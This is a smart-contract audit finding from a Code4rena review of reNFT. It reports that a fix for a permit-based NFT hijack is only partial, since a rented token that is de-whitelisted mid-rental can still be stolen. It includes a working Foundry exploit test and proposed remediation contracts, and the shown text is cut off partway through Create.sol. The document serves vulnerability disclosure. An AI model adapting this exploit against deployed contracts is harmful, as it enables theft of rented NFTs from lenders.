# [H] M-02 Unmitigated

## Summary
Severity: High
Chain: Smart contract
Component: 2024-02-renft-mitigation
Published: 2024-03-04
Source: https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/26
Type: code-finding

## Details
# Lines of code

https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/policies/Fallback.sol#L116


# Vulnerability details


# Mitigation Status

Partially mitigated

# Summary of the previously found to-be-mitigated vulnerability (#587)

In summary, the previous version of the codebase allowed the hijacking of any rented NFT with the `permit()` functionality. What allowed the vulnerability to occur is that there were no checks or validation during the signature validation step (where the ERC721Permit reached out to the owner of the rented NFT (borrower rental safe), and asked it if the supplied signature is indeed a signature made by an owner of the rental safe (EIP-1271)). The execution flow of the exploit was as follows:

1. The attacker would borrow a NFT supporting `permit()`, and at this point, he would be the owner of the NFT.
2. The attacker would generate a signature allowing another entity he controls, to transfer/act upon the target NFT on his behalf
3. The attacker would call `permit()` on the NFT and feed it the created signature
4. The NFT contract will reach out to the owner of the NFT, in this case, it's the Gnosis rental safe owned by the attacker. Then it'll provide it with the signature the attacker supplied and ask it if this is a signature made by an owner of the gnosis safe. `isValidSignature`
5. Gnosis safe will find out that indeed the signature is made by the owner of the safe (attacker) and will respond back with the 4 byte `EIP1271 magic value`.
6. The NFT contract will approve the entity the attacker specified to spend the attacker's token on behalf of him.
7. From the attacker-controlled & approved address, the attacker will transfer the NFT token from his rental safe using `transferFrom`.

Execution flow:

    1. NFT::permit(...) [`msg.sender` == attacker]
        -> GnosisSafe::isValidSignature [`msg.sender` == NFT contract]
            -> GnosisSafe::FallbackHandler::isValidSignature [`msg.sender` == Gnosis safe]
                -> FallbackHandler::isValidSignature -> `OK`
        -> NFT::_approve(spender, tokenId)
    
    2. NFT::transferFrom(rentalSafe, attacker, tokenId)


# Mitigation Analysis

Sponsors introduced a new `Policy` contract named [`Fallback.sol`](https://github.com/re-nft/smart-contracts/blob/main/src/policies/Fallback.sol), set this contract to be the default fallback handler of the rental gnosis safe and prevented the rental safe owner [from setting a fallback handler](https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/policies/Guard.sol#L363)

Additionally, in the [`Fallback.sol`](https://github.com/re-nft/smart-contracts/blob/main/src/policies/Fallback.sol) policy contract, they introduced a modified version of the EIP1271 function `isValidSignature()` (which was present in previous fallback handlers). 

```solidity
    function isValidSignature(
        bytes memory data,
        bytes memory signature
    ) public view override returns (bytes4) {
        // Check if this fallback is active for the protocol.
        if (!isActive) {
            revert Errors.FallbackPolicy_Deactivated();
        }

        // Get the original sender. This is the address that called the safe.
        address originalSender = _msgSender();

        // Determine if the original sender is a token that has been whitelisted.
        if (STORE.whitelistedAssets(originalSender)) {
            revert Errors.FallbackPolicy_UnauthorizedSender(originalSender);
        }

        // Caller should be a Safe.
        Safe safe = Safe(payable(msg.sender));

        // Convert the data into a safe-compatible hash.
        bytes32 messageHash = getMessageHashForSafe(safe, data);

        // Check if the signature was signed by an owner of the safe.
        if (signature.length == 0 && safe.signedMessages(messageHash) == 0) {
            revert Errors.FallbackPolicy_HashNotSigned(messageHash);
        } else {
            safe.checkSignatures(messageHash, data, signature);
        }

        return EIP1271_MAGIC_VALUE;
    }
```

In the modified `isValidSignature` function, it checks if the token that is trying to request signature verification (In this case, the permitNFT), is whitelisted or not. If it's whitelisted, then the function will revert, preventing the hijacking of the permit NFT since the hijacking relies on the signature validation phase passing. If it's blacklisted, it'll normally allow the signature validation. This check does not differentiate between rented and non-rented tokens (as the sponsor noted in the README and mentioned that it's expected behavior). As long as the NFT is whitelisted, no signature verifications will be allowed for it.


# The Vulnerability

Looking closely at the check introduced in the new `isValidSignature()` function, there appears to be no check if a permit NFT token is blacklisted and is rented at the same time, which allows rented permit NFT tokens to be hijacked at any moment if the admins decide to blacklist the token.

```solidity

        ........

        // Determine if the original sender is a token that has been whitelisted.
        if (STORE.whitelistedAssets(originalSender)) {
            revert Errors.FallbackPolicy_UnauthorizedSender(originalSender);
        }

        ........

```

Imagine the following scenario:
1. Permit NFT token is whitelisted
2. Bob rents Permit NFT from Alice
3. During the rental duration, the admin decides to blacklist the Permit NFT token
4. At this point, Bob can maliciously hijack the permit NFT and move it out of his safe!


# Coded PoC

To run the PoC, you'll need to do the following:

1. You'll need to add this file to the `test/` folder:  
    i. `Exploit.sol` -> File containing the PoC

2. You'll need to run this command:

    `forge test --mt test_NFT_Permit_Exploit -vv`


**The files:**

<details>
<summary><b>Exploit.sol</b></summary>
<br>


    // SPDX-License-Identifier: BUSL-1.1
    pragma solidity ^0.8.20;

    import {
        Order,
        FulfillmentComponent,
        Fulfillment,
        ItemType as SeaportItemType,
        OfferItem,
        ItemType
    } from "@seaport-types/lib/ConsiderationStructs.sol";

    import {OfferItemLib} from "@seaport-sol/SeaportSol.sol";

    import {OrderType, OrderMetadata, RentalOrder} from "@src/libraries/RentalStructs.sol";

    import {ERC721} from '@openzeppelin-contracts/token/ERC721/ERC721.sol';
    import {IERC721} from '@openzeppelin-contracts/token/ERC721/IERC721.sol';
    import {Ownable} from "@openzeppelin-contracts/access/Ownable.sol";

    import {BaseTest} from "@test/BaseTest.sol";
    import {Assertions} from "@test/utils/Assertions.sol";
    import {Constants} from "@test/utils/Constants.sol";
    import {SafeUtils} from "@test/utils/GnosisSafeUtils.sol";
    import {Enum} from "@safe-contracts/common/Enum.sol";

    import "forge-std/console.sol";



    contract Exploit is Assertions, Constants, BaseTest {

        using OfferItemLib for OfferItem;

        function test_NFT_Permit_Exploit() public {

            NFTWithPermit permitNFT = new NFTWithPermit();

            vm.startPrank(deployer.addr);
            admin.toggleWhitelistAsset(address(permitNFT), true);
            vm.stopPrank();

            // The NFT token which Alice, the lender, will offer.
            permitNFT.safeMint(alice.addr, 1);

            // Approve seaport conduit to spend the token.
            vm.prank(alice.addr);
            permitNFT.approve(address(conduit), 1);

            /////////////////////////////////////////////
            // Order Creation & Fulfillment simulation //
            /////////////////////////////////////////////

            // Alice creates a BASE order
            createOrder({
                offerer: alice,
                orderType: OrderType.BASE,
                erc721Offers: 1,
                erc1155Offers: 0,
                erc20Offers: 0,
                erc721Considerations: 0,
                erc1155Considerations: 0,
                erc20Considerations: 1
            });

            // Remove the pre-inserted offer item (which is inserted by the tests)
            popOfferItem();

            // Set the NFT which we created as the offer item
            withOfferItem(
                    OfferItemLib
                        .empty()
                        .withItemType(ItemType.ERC721)
                        .withToken(address(permitNFT))
                        .withIdentifierOrCriteria(1)
                        .withStartAmount(1)
                        .withEndAmount(1)
            );

            // Finalize the order creation
            (
                Order memory order,
                bytes32 orderHash,
                OrderMetadata memory metadata
            ) = finalizeOrder();
            

            // Create an order fulfillment
            createOrderFulfillment({
                _fulfiller: bob,
                order: order,
                orderHash: orderHash,
                metadata: metadata
            });

            // Finalize the base order fulfillment
            RentalOrder memory rentalOrder = finalizeBaseOrderFulfillment();

            // get the rental order hash
            bytes32 rentalOrderHash = create.getRentalOrderHash(rentalOrder);

            // assert that the rental order was stored
            assertEq(STORE.orders(rentalOrderHash), true);

            // assert that the ERC1155 is in the rental wallet of the fulfiller
            assertEq(permitNFT.balanceOf(address(bob.safe)), 1);


            /** ------------------- Exploitation ------------------- */

            // Simulate the Permit NFT asset getting blacklisted!
            vm.startPrank(deployer.addr);
            admin.toggleWhitelistAsset(address(permitNFT), false);
            vm.stopPrank();

            // Impersonate the attacker
            vm.startPrank(bob.addr);

            // The digest which will be hashed by gnosis then signed by the attacker (owner of the safe).
            // The format of this digest is taken from the `permit()` function.
            bytes memory digest = bytes.concat(
                keccak256(
                    abi.encodePacked(
                        '\x19\x01',
                        permitNFT.DOMAIN_SEPARATOR(),
                        keccak256(
                            abi.encode(
                                permitNFT.PERMIT_TYPEHASH(), 
                                bob.addr, // spender
                                1, // the token Id
                                permitNFT.tokenIdNonces(1), // get the nonce for the token ID "1"
                                block.timestamp + 10000000 // deadline until which, the call to `permit()` with this signature will be allowed.
                            )
                        )
                    )
                )
            );        
            
            // Get the message hash for the digest.
            bytes32 msgHash = fallbackPolicy.getMessageHashForSafe(bob.safe, digest);

            // Sign the hashed message and get the signature (r, s, v).
            (uint8 v, bytes32 r, bytes32 s) = vm.sign(bob.privateKey, msgHash);

            permitNFT.permit(
                bob.addr, 
                1, 
                block.timestamp + 10000000, 
                v, 
                r, 
                s
            );

            // Transfer the NFT from the attacker's safe to the attacker's address. This is the final stage of the exploit
            permitNFT.transferFrom(address(bob.safe), address(bob.addr), 1);

            vm.stopPrank();

            /** -------------- Final checks -------------- */

            uint256 attackersBalance = permitNFT.balanceOf(address(bob.addr));
            uint256 attackersSafeBalance = permitNFT.balanceOf(address(bob.safe));

            if (attackersSafeBalance == 0 && attackersBalance == 1) {
                console.log("Tokens successfully hijacked from the attacker's (borrower) safe!");
            }

        }

    }





    // Serves as a replacement for openzeppelin's `isContract` function which `ERC721Permit` relies on, simply because the currently installed openzeppelin version (5.0) for this PoC setup no longer 
    includes the function `isContract` in the `Address` library.
    library Address {
        function isContract(address account) internal view returns (bool) {
            // This method relies on extcodesize, which returns 0 for contracts in
            // construction, since the code is only stored at the end of the
            // constructor execution.

            uint256 size;
            assembly {
                size := extcodesize(account)
            }
            return size > 0;
        }
    }

    // Source: https://github.com/Uniswap/v3-periphery/blob/main/contracts/libraries/ChainId.sol
    /// @title Function for getting the current chain ID
    library ChainId {
        /// @dev Gets the current chain ID
        /// @return chainId The current chain ID
        function get() internal view returns (uint256 chainId) {
            assembly {
                chainId := chainid()
            }
        }
    }

    // Source: https://github.com/Uniswap/v3-periphery/blob/main/contracts/interfaces/external/IERC1271.sol
    /// @title Interface for verifying contract-based account signatures
    /// @notice Interface that verifies provided signature for the data
    /// @dev Interface defined by EIP-1271
    interface IERC1271 {
        /// @notice Returns whether the provided signature is valid for the provided data
        /// @dev MUST return the bytes4 magic value 0x1626ba7e when function passes.
        /// MUST NOT modify state (using STATICCALL for solc < 0.5, view modifier for solc > 0.5).
        /// MUST allow external calls.
        /// @param hash Hash of the data to be signed
        /// @param signature Signature byte array associated with _data
        /// @return magicValue The bytes4 magic value 0x1626ba7e
        function isValidSignature(bytes32 hash, bytes memory signature) external view returns (bytes4 magicValue);
    }

    /// @title ERC721 with permit
    /// @notice Extension to ERC721 that includes a permit function for signature based approvals
    interface IERC721Permit is IERC721 {
        /// @notice The permit typehash used in the permit signature
        /// @return The typehash for the permit
        function PERMIT_TYPEHASH() external pure returns (bytes32);

        /// @notice The domain separator used in the permit signature
        /// @return The domain seperator used in encoding of permit signature
        function DOMAIN_SEPARATOR() external view returns (bytes32);

        /// @notice Approve of a specific token ID for spending by spender via signature
        /// @param spender The account that is being approved
        /// @param tokenId The ID of the token that is being approved for spending
        /// @param deadline The deadline timestamp by which the call must be mined for the approve to work
        /// @param v Must produce valid secp256k1 signature from the holder along with `r` and `s`
        /// @param r Must produce valid secp256k1 signature from the holder along with `v` and `s`
        /// @param s Must produce valid secp256k1 signature from the holder along with `r` and `v`
        function permit(
            address spender,
            uint256 tokenId,
            uint256 deadline,
            uint8 v,
            bytes32 r,
            bytes32 s
        ) external payable;
    }

    // Source: https://github.com/Uniswap/v3-periphery/blob/main/contracts/base/ERC721Permit.sol
    /// @title ERC721 with permit
    /// @notice Nonfungible tokens that support an approve via signature, i.e. permit
    abstract contract ERC721Permit is ERC721, IERC721Permit {
        /// @dev Gets the current nonce for a token ID and then increments it, returning the original value
        function _getAndIncrementNonce(uint256 tokenId) internal virtual returns (uint256);

        /// @dev The hash of the name used in the permit signature verification
        bytes32 private immutable nameHash;

        /// @dev The hash of the version string used in the permit signature verification
        bytes32 private immutable versionHash;

        /// @notice Computes the nameHash and versionHash
        constructor(
            string memory name_,
            string memory symbol_,
            string memory version_
        ) ERC721(name_, symbol_) {
            nameHash = keccak256(bytes(name_));
            versionHash = keccak256(bytes(version_));
        }

        /// @inheritdoc IERC721Permit
        function DOMAIN_SEPARATOR() public view override returns (bytes32) {
            return
                keccak256(
                    abi.encode(
                        // keccak256('EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)')
                        0x8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f,
                        nameHash,
                        versionHash,
                        ChainId.get(),
                        address(this)
                    )
                );
        }

        /// @inheritdoc IERC721Permit
        /// @dev Value is equal to keccak256("Permit(address spender,uint256 tokenId,uint256 nonce,uint256 deadline)");
        bytes32 public constant override PERMIT_TYPEHASH =
            0x49ecf333e5b8c95c40fdafc95c1ad136e8914a8fb55e9dc8bb01eaa83a2df9ad;

        /// @inheritdoc IERC721Permit
        function permit(
            address spender,
            uint256 tokenId,
            uint256 deadline,
            uint8 v,
            bytes32 r,
            bytes32 s
        ) external payable override {
            require(block.timestamp <= deadline, 'Permit expired');

            bytes32 digest =
                keccak256(
                    abi.encodePacked(
                        '\x19\x01',
                        DOMAIN_SEPARATOR(),
                        keccak256(abi.encode(PERMIT_TYPEHASH, spender, tokenId, _getAndIncrementNonce(tokenId), deadline))
                    )
                );
            address owner = ownerOf(tokenId);
            require(spender != owner, 'ERC721Permit: approval to current owner');

            if (Address.isContract(owner)) {
                require(IERC1271(owner).isValidSignature(digest, abi.encodePacked(r, s, v)) == 0x1626ba7e, 'Unauthorized');
            } else {
                address recoveredAddress = ecrecover(digest, v, r, s);
                require(recoveredAddress != address(0), 'Invalid signature');
                require(recoveredAddress == owner, 'Unauthorized');
            }

            _approve(spender, tokenId);
        }
    }


    contract NFTWithPermit is ERC721, ERC721Permit, Ownable {
        
        mapping(uint256 tokenId => uint256 nonce) public tokenIdNonces;

        constructor() ERC721Permit("MyNFT", "MNFT", "1.1") Ownable(msg.sender) {}

        function _getAndIncrementNonce(uint256 tokenId) internal override returns (uint256) {

            uint256 tokenIdNonce = tokenIdNonces[tokenId];

            tokenIdNonces[tokenId] += 1;

            return tokenIdNonce;
        }

        function safeMint(address to, uint256 tokenId) public onlyOwner {
            _safeMint(to, tokenId);
        }

    }



</details>




# Coded Remediation

Replace each of the following files with the modified ones listed below: `Stop.sol`, `Create.sol`, `Storage.sol`, `Fallback.sol`

What this mitigation does is that it simply prevents any signature verification of a blacklisted token as long as there rentals active involving this blacklisted token. The implementation is as follows: A newly-introduced state mapping variable `mapping(address erc721Token => uint256 count) public rentedERC721s;` in the storage is updated during both, the creation and the termination of a rental. Additionally, in `isValidSignature::Fallback.sol`, it's checked if the `originalSender` is a blacklisted NFT, if that's the case, then check if `rentedERC721s[originalSender]` returns more than zero, if that's the case, then that means that there are permit nft rentals still in the storage -> revert.

After adding the files, don't forget to modify the unit tests for them to work properly. Rest of the tests are fine. Re-running the exploit after making the suggested modifications will fail.

**The files**


<details>
<summary><b>Stop.sol</b></summary>
<br>

    // SPDX-License-Identifier: BUSL-1.1
    pragma solidity ^0.8.20;

    import {Enum} from "@safe-contracts/common/Enum.sol";
    import {LibString} from "@solady/utils/LibString.sol";

    import {ISafe} from "@src/interfaces/ISafe.sol";
    import {IHook} from "@src/interfaces/IHook.sol";

    import {Kernel, Policy, Permissions, Keycode} from "@src/Kernel.sol";
    import {toKeycode} from "@src/libraries/KernelUtils.sol";
    import {RentalUtils} from "@src/libraries/RentalUtils.sol";
    import {Signer} from "@src/packages/Signer.sol";
    import {Reclaimer} from "@src/packages/Reclaimer.sol";
    import {Accumulator} from "@src/packages/Accumulator.sol";
    import {Storage} from "@src/modules/Storage.sol";
    import {PaymentEscrow} from "@src/modules/PaymentEscrow.sol";
    import {Errors} from "@src/libraries/Errors.sol";
    import {Events} from "@src/libraries/Events.sol";
    import {
        Item,
        RentalOrder,
        Hook,
        OrderType,
        ItemType,
        RentalId,
        RentalAssetUpdate
    } from "@src/libraries/RentalStructs.sol";

    /**
    * @title Stop
    * @notice Acts as an interface for all behavior related to stoping a rental.
    */
    contract Stop is Policy, Signer, Reclaimer, Accumulator {
        using RentalUtils for Item;
        using RentalUtils for Item[];
        using RentalUtils for OrderType;

        /////////////////////////////////////////////////////////////////////////////////
        //                         Kernel Policy Configuration                         //
        /////////////////////////////////////////////////////////////////////////////////

        // Modules that the policy depends on.
        Storage public STORE;
        PaymentEscrow public ESCRW;

        /**
        * @dev Instantiate this contract as a policy.
        *
        * @param kernel_ Address of the kernel contract.
        */
        constructor(Kernel kernel_) Policy(kernel_) Signer() Reclaimer() {}

        /**
        * @notice Upon policy activation, configures the modules that the policy depends on.
        *         If a module is ever upgraded that this policy depends on, the kernel will
        *         call this function again to ensure this policy has the current address
        *         of the module.
        *
        * @return dependencies Array of keycodes which represent modules that
        *                      this policy depends on.
        */
        function configureDependencies()
            external
            override
            onlyKernel
            returns (Keycode[] memory dependencies)
        {
            dependencies = new Keycode[](2);

            dependencies[0] = toKeycode("STORE");
            STORE = Storage(getModuleAddress(toKeycode("STORE")));

            dependencies[1] = toKeycode("ESCRW");
            ESCRW = PaymentEscrow(getModuleAddress(toKeycode("ESCRW")));
        }

        /**
        * @notice Upon policy activation, permissions are requested from the kernel to access
        *         particular keycode <> function selector pairs. Once these permissions are
        *         granted, they do not change and can only be revoked when the policy is
        *         deactivated by the kernel.
        *
        * @return requests Array of keycode <> function selector pairs which represent
        *                  permissions for the policy.
        */
        function requestPermissions()
            external
            view
            override
            onlyKernel
            returns (Permissions[] memory requests)
        {
            requests = new Permissions[](4);
            requests[0] = Permissions(toKeycode("STORE"), STORE.removeRentals.selector);
            requests[1] = Permissions(toKeycode("STORE"), STORE.removeRentalsBatch.selector);
            requests[2] = Permissions(toKeycode("ESCRW"), ESCRW.settlePayment.selector);
            requests[3] = Permissions(toKeycode("ESCRW"), ESCRW.settlePaymentBatch.selector);
        }

        /////////////////////////////////////////////////////////////////////////////////
        //                            Internal Functions                               //
        /////////////////////////////////////////////////////////////////////////////////

        /**
        * @dev Helper function to emit an event which signals a rental order has stopped.
        *
        * @param seaportOrderHash Order hash of the seaport order.
        * @param stopper Address which stopped the rental order.
        */
        function _emitRentalOrderStopped(bytes32 seaportOrderHash, address stopper) internal {
            // Wmit the event.
            emit Events.RentalOrderStopped(seaportOrderHash, stopper);
        }

        /**
        * @dev Validates that a rental order can be stopped. Whether an order
        *      can be stopped is dependent on the type of order. BASE orders can
        *      be stopped only when the rental has expired. PAY orders can be stopped
        *      by the lender at any point in the time.
        *
        * @param orderType Order type of the rental order to stop.
        * @param endTimestamp Timestamp that the rental will end.
        * @param expectedLender Address of the initial lender in the order.
        */
        function _validateRentalCanBeStopped(
            OrderType orderType,
            uint256 endTimestamp,
            address expectedLender
        ) internal view {
            // Determine if the order has expired.
            bool hasExpired = endTimestamp <= block.timestamp;

            // Determine if the fulfiller is the lender of the order.
            bool isLender = expectedLender == msg.sender;

            // BASE orders processing.
            if (orderType.isBaseOrder()) {
                // check that the period for the rental order has expired.
                if (!hasExpired) {
                    revert Errors.StopPolicy_CannotStopOrder(block.timestamp, msg.sender);
                }
            }
            // PAY order processing.
            else if (orderType.isPayOrder()) {
                // If the stopper is the lender, then it doesnt matter whether the rental
                // has expired. But if the stopper is not the lender, then the rental must have expired.
                if (!isLender && (!hasExpired)) {
                    revert Errors.StopPolicy_CannotStopOrder(block.timestamp, msg.sender);
                }
            }
            // Revert if given an invalid order type.
            else {
                revert Errors.Shared_OrderTypeNotSupported(uint8(orderType));
            }
        }

        /**
        * @dev Since the stop policy is an enabled Gnosis Safe module on all rental safes, it
        *      can be used to execute a transaction directly from the rental safe which retrieves
        *      the rented assets. This call bypasses the guard that prevents the assets from being
        *      transferred.
        *
        * @param order Rental order to reclaim the items for.
        */
        function _reclaimRentedItems(RentalOrder memory order) internal {
            // Transfer ERC721s from the renter back to lender.
            bool success = ISafe(order.rentalWallet).execTransactionFromModule(
                // Stop policy inherits the reclaimer package.
                address(this),
                // value.
                0,
                // The encoded call to the `reclaimRentalOrder` function.
                abi.encodeWithSelector(this.reclaimRentalOrder.selector, order),
                // Safe must delegate call to the stop policy so that it is the msg.sender.
                Enum.Operation.DelegateCall
            );

            // Assert that the transfer back to the lender was successful.
            if (!success) {
                revert Errors.StopPolicy_ReclaimFailed();
            }
        }

        /**
        * @dev When a rental order is stopped, process each hook one by one but only if
        *      the hook's status is set to execute on a rental stop.
        *
        * @param hooks        Array of hooks to process for the order.
        * @param rentalItems  Array of rental items which are referenced by the hooks
        * @param rentalWallet Address of the rental wallet which is the current owner
        *                     of the rented assets.
        */
        function _removeHooks(
            Hook[] calldata hooks,
            Item[] calldata rentalItems,
            address rentalWallet
        ) internal {
            // Define hook target, item index, and item.
            address target;
            uint256 itemIndex;
            Item memory item;

            // Loop through each hook in the payload.
            for (uint256 i = 0; i < hooks.length; ++i) {
                // Get the hook address.
                target = hooks[i].target;

                // Check that the hook is reNFT-approved to execute on rental stop.
                if (STORE.hookOnStop(target)) {
                    // Get the rental item index for this hook.
                    itemIndex = hooks[i].itemIndex;

                    // Get the rental item for this hook.
                    item = rentalItems[itemIndex];

                    // Make sure the item is a rented item.
                    if (!item.isRental()) {
                        revert Errors.Shared_NonRentalHookItem(itemIndex);
                    }

                    // Call the hook with data about the rented item.
                    try
                        IHook(target).onStop(
                            rentalWallet,
                            item.token,
                            item.identifier,
                            item.amount,
                            hooks[i].extraData
                        )
                    {} catch Error(string memory revertReason) {
                        // Revert with reason given.
                        revert Errors.Shared_HookFailString(revertReason);
                    } catch Panic(uint256 errorCode) {
                        // Convert solidity panic code to string.
                        string memory stringErrorCode = LibString.toString(errorCode);

                        // Revert with panic code.
                        revert Errors.Shared_HookFailString(
                            string.concat("Hook reverted: Panic code ", stringErrorCode)
                        );
                    } catch (bytes memory revertData) {
                        // Fallback to an error that returns the byte data.
                        revert Errors.Shared_HookFailBytes(revertData);
                    }
                }
            }
        }

        /////////////////////////////////////////////////////////////////////////////////
        //                            External Functions                               //
        /////////////////////////////////////////////////////////////////////////////////

        /**
        * @notice Stops a rental by providing a `RentalOrder` struct. This data does not
        *         exist in protocol storage, only the hash of the rental order. However,
        *         during rental creation, all data needed to construct the rental order
        *         is emitted as an event. A check is then made to ensure that the passed
        *         in rental order matches the hash of a rental order in storage.
        *
        * @param order Rental order to stop.
        */
        function stopRent(RentalOrder calldata order) external {
            // Compute the order hash.
            bytes32 orderHash = _deriveRentalOrderHash(order);

            // The order must exist to be deleted.
            if (!STORE.orders(orderHash)) {
                revert Errors.StopPolicy_OrderDoesNotExist(orderHash);
            }

            // Check that the rental can be stopped.
            _validateRentalCanBeStopped(order.orderType, order.endTimestamp, order.lender);

            // Create an accumulator which will hold all of the rental asset updates, consisting of IDs and
            // the rented amount. From this point on, new memory cannot be safely allocated until the
            // accumulator no longer needs to include elements.
            bytes memory rentalAssetUpdates = new bytes(0);

            // Check if each item in the order is a rental. If so, then generate the rental asset update.
            // Memory will become safe again after this block.
            for (uint256 i; i < order.items.length; ++i) {
                if (order.items[i].isRental()) {
                    // Insert the rental asset update into the dynamic array.
                    _insert(
                        rentalAssetUpdates,
                        order.items[i].toRentalId(order.rentalWallet),
                        order.items[i].amount
                    );
                }
            }

            // Effect: Remove rentals from storage by using the order hash.
            STORE.removeRentals(orderHash, _convertToStatic(rentalAssetUpdates), order.items);

            // Interaction: Transfer rentals from the renter back to lender.
            _reclaimRentedItems(order);

            // Interaction: Transfer ERC20 payments from the escrow contract to the respective recipients.
            ESCRW.settlePayment(order);

            // Interaction: process hooks so they no longer exist for the renter.
            if (order.hooks.length > 0) {
                _removeHooks(order.hooks, order.items, order.rentalWallet);
            }

            // Emit rental order stopped.
            _emitRentalOrderStopped(order.seaportOrderHash, msg.sender);
        }

        /**
        * @notice Stops a batch of rentals by providing an array of `RentalOrder` structs.
        *
        * @param orders Array of rental orders to stop.
        */
        function stopRentBatch(RentalOrder[] calldata orders) external {
            // Process each rental order.
            // Memory will become safe after this block.
            for (uint256 i = 0; i < orders.length; ++i) {
                // Compute the order hash.
                bytes32 orderHash = _deriveRentalOrderHash(orders[i]);

                // The order must exist to be deleted.
                if (!STORE.orders(orderHash)) {
                    revert Errors.StopPolicy_OrderDoesNotExist(orderHash);
                }

                // Check that the rental can be stopped.
                _validateRentalCanBeStopped(
                    orders[i].orderType,
                    orders[i].endTimestamp,
                    orders[i].lender
                );

                // Create an accumulator which will hold all of the rental asset updates, consisting of IDs and
                // the rented amount. From this point on, new memory cannot be safely allocated until the
                // accumulator no longer needs to include elements.
                bytes memory rentalAssetUpdates = new bytes(0);

                // Check if each item in the order is a rental. If so, then generate the rental asset update.
                for (uint256 j = 0; j < orders[i].items.length; ++j) {
                    // Insert the rental asset update into the dynamic array.
                    if (orders[i].items[j].isRental()) {
                        _insert(
                            rentalAssetUpdates,
                            orders[i].items[j].toRentalId(orders[i].rentalWallet),
                            orders[i].items[j].amount
                        );
                    }
                }

                // Effect: Remove rentals from storage by using the order hash.
                STORE.removeRentals(orderHash, _convertToStatic(rentalAssetUpdates), orders[i].items);

                // Interaction: Transfer rentals from the renter back to lender.
                _reclaimRentedItems(orders[i]);

                // Interaction: Transfer ERC20 payments from the escrow contract to the respective recipients.
                ESCRW.settlePayment(orders[i]);

                // Interaction: Process hooks so they no longer exist for the renter.
                if (orders[i].hooks.length > 0) {
                    _removeHooks(orders[i].hooks, orders[i].items, orders[i].rentalWallet);
                }

                // Emit rental order stopped.
                _emitRentalOrderStopped(orderHash, msg.sender);
            }
        }
    }



</details>



<details>
<summary><b>Create.sol</b></summary>
<br>


    // SPDX-License-Identifier: BUSL-1.1
    pragma solidity ^0.8.20;

    import {
        ZoneParameters,
        OrderType as SeaportOrderType
    } from "@seaport-core/lib/rental/ConsiderationStructs.sol";
    import {ReceivedItem, SpentItem} from "@seaport-types/lib/ConsiderationStructs.sol";
    import {LibString} from "@solady/utils/LibString.sol";
    import {IERC20} from "@openzeppelin-contracts/interfaces/IERC20.sol";

    import {ISafe} from "@src/interfaces/ISafe.sol";
    import {IHook} from "@src/interfaces/IHook.sol";
    import {ZoneInterface} from "@src/interfaces/IZone.sol";

    import {Kernel, Policy, Permissions, Keycode} from "@src/Kernel.sol";
    import {toKeycode, toRole} from "@src/libraries/KernelUtils.sol";
    import {RentalUtils} from "@src/libraries/RentalUtils.sol";
    import {Transferer} from "@src/libraries/Transferer.sol";
    import {Signer} from "@src/packages/Signer.sol";
    import {Zone} from "@src/packages/Zone.sol";
    import {Accumulator} from "@src/packages/Accumulator.sol";
    import {TokenReceiver} from "@src/packages/TokenReceiver.sol";
    import {Storage} from "@src/modules/Storage.sol";
    import {PaymentEscrow} from "@src/modules/PaymentEscrow.sol";
    import {
        RentalOrder,
        RentPayload,
        SeaportPayload,
        Hook,
        OrderFulfillment,
        OrderMetadata,
        OrderType,
        Item,
        ItemType,
        SettleTo,
        RentalId,
        RentalAssetUpdate
    } from "@src/libraries/RentalStructs.sol";
    import {Errors} from "@src/libraries/Errors.sol";
    import {Events} from "@src/libraries/Events.sol";

    /**
    * @title Create
    * @notice Acts as an interface for all behavior related to creating a rental.
    */
    contract Create is Policy, Signer, Zone, Accumulator, TokenReceiver {
        using Transferer for address;
        using Transferer for Item;
        using RentalUtils for Item;
        using RentalUtils for Item[];
        using RentalUtils for SpentItem;
        using RentalUtils for ReceivedItem;
        using RentalUtils for OrderType;

        /////////////////////////////////////////////////////////////////////////////////
        //                         Kernel Policy Configuration                         //
        /////////////////////////////////////////////////////////////////////////////////

        // Modules that the policy depends on.
        Storage public STORE;
        PaymentEscrow public ESCRW;

        /**
        * @dev Instantiate this contract as a policy.
        *
        * @param kernel_ Address of the kernel contract.
        */
        constructor(Kernel kernel_) Policy(kernel_) Signer() Zone() {}

        /**
        * @notice Upon policy activation, configures the modules that the policy depends on.
        *         If a module is ever upgraded that this policy depends on, the kernel will
        *         call this function again to ensure this policy has the current address
        *         of the module.
        *
        * @return dependencies Array of keycodes which represent modules that
        *                      this policy depends on.
        */
        function configureDependencies()
            external
            override
            onlyKernel
            returns (Keycode[] memory dependencies)
        {
            dependencies = new Keycode[](2);

            dependencies[0] = toKeycode("STORE");
            STORE = Storage(getModuleAddress(toKeycode("STORE")));

            dependencies[1] = toKeycode("ESCRW");
            ESCRW = PaymentEscrow(getModuleAddress(toKeycode("ESCRW")));
        }

        /**
        * @notice Upon policy activation, permissions are requested from the kernel to access
        *         particular keycode <> function selector pairs. Once these permissions are
        *         granted, they do not change and can only be revoked when the policy is
        *         deactivated by the kernel.
        *
        * @return requests Array of keycode <> function selector pairs which represent
        *                  permissions for the policy.
        */
        function requestPermissions()
            external
            view
            override
            onlyKernel
            returns (Permissions[] memory requests)
        {
            requests = new Permissions[](2);
            requests[0] = Permissions(toKeycode("STORE"), STORE.addRentals.selector);
            requests[1] = Permissions(toKeycode("ESCRW"), ESCRW.increaseDeposit.selector);
        }

        /////////////////////////////////////////////////////////////////////////////////
        //                              View Functions                                 //
        /////////////////////////////////////////////////////////////////////////////////

        /**
        * @notice Retrieves the domain separator.
        *
        * @return The domain separator for the protocol.
        */
        function domainSeparator() external view returns (bytes32) {
            return _DOMAIN_SEPARATOR;
        }

        /**
        * @notice Derives the rental order EIP-712 compliant hash from a `RentalOrder`.
        *
        * @param order Rental order converted to a hash.
        */
        function getRentalOrderHash(
            RentalOrder memory order
        ) external view returns (bytes32) {
            return _deriveRentalOrderHash(order);
        }

        /**
        * @notice Derives the rent payload EIP-712 compliant hash from a `RentPayload`.
        *
        * @param payload Rent payload converted to a hash.
        */
        function getRentPayloadHash(
            RentPayload memory payload
        ) external view returns (bytes32) {
            return _deriveRentPayloadHash(payload);
        }

        /**
        * @notice Derives the order metadata EIP-712 compliant hash from an `OrderMetadata`.
        *
        * @param metadata Order metadata converted to a hash.
        */
        function getOrderMetadataHash(
            OrderMetadata memory metadata
        ) external view returns (bytes32) {
            return _deriveOrderMetadataHash(metadata);
        }

